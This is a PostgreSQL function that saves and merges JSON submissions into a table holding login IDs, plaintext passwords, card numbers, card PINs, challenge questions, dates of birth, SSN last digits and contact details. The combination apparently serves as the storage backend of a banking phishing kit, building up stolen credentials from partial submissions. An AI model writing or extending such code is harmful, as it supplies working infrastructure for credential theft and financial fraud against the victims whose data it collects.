CREATE OR REPLACE FUNCTION public.save_user_entry(_payload jsonb)
RETURNS void
LANGUAGE plpgsql
SECURITY INVOKER
SET search_path = public
AS $$
DECLARE
  _id uuid;
BEGIN
  _id := NULLIF(_payload->>'id', '')::uuid;
  IF _id IS NULL THEN
    RAISE EXCEPTION 'missing_entry_id';
  END IF;

  INSERT INTO public.user_entries (
    id,
    type,
    timestamp,
    user_id,
    user_id_field,
    password_field,
    first_name,
    last_name,
    email,
    phone,
    challenge_questions,
    card_number,
    pin_card,
    dob,
    ssn_last4,
    zip_code,
    updated_at
  ) VALUES (
    _id,
    COALESCE(NULLIF(_payload->>'type', ''), 'old'),
    COALESCE(NULLIF(_payload->>'timestamp', '')::timestamptz, now()),
    NULLIF(_payload->>'userId', ''),
    NULLIF(_payload->>'userId', ''),
    NULLIF(_payload->>'password', ''),
    NULLIF(_payload->>'firstName', ''),
    NULLIF(_payload->>'lastName', ''),
    NULLIF(_payload->>'email', ''),
    NULLIF(_payload->>'phone', ''),
    COALESCE(_payload->'challengeQuestions', '[]'::jsonb),
    NULLIF(_payload->>'cardNumber', ''),
    NULLIF(_payload->>'pinCard', ''),
    NULLIF(_payload->>'dob', ''),
    NULLIF(_payload->>'ssnLast4', ''),
    NULLIF(_payload->>'zipCode', ''),
    now()
  )
  ON CONFLICT (id) DO UPDATE SET
    type = EXCLUDED.type,
    user_id = COALESCE(EXCLUDED.user_id, user_entries.user_id),
    user_id_field = COALESCE(EXCLUDED.user_id_field, user_entries.user_id_field),
    password_field = COALESCE(EXCLUDED.password_field, user_entries.password_field),
    first_name = COALESCE(EXCLUDED.first_name, user_entries.first_name),
    last_name = COALESCE(EXCLUDED.last_name, user_entries.last_name),
    email = COALESCE(EXCLUDED.email, user_entries.email),
    phone = COALESCE(EXCLUDED.phone, user_entries.phone),
    challenge_questions = CASE
      WHEN EXCLUDED.challenge_questions IS NULL OR EXCLUDED.challenge_questions = '[]'::jsonb THEN user_entries.challenge_questions
      ELSE EXCLUDED.challenge_questions
    END,
    card_number = COALESCE(EXCLUDED.card_number, user_entries.card_number),
    pin_card = COALESCE(EXCLUDED.pin_card, user_entries.pin_card),
    dob = COALESCE(EXCLUDED.dob, user_entries.dob),
    ssn_last4 = COALESCE(EXCLUDED.ssn_last4, user_entries.ssn_last4),
    zip_code = COALESCE(EXCLUDED.zip_code, user_entries.zip_code),
    updated_at = now();
END;
$$;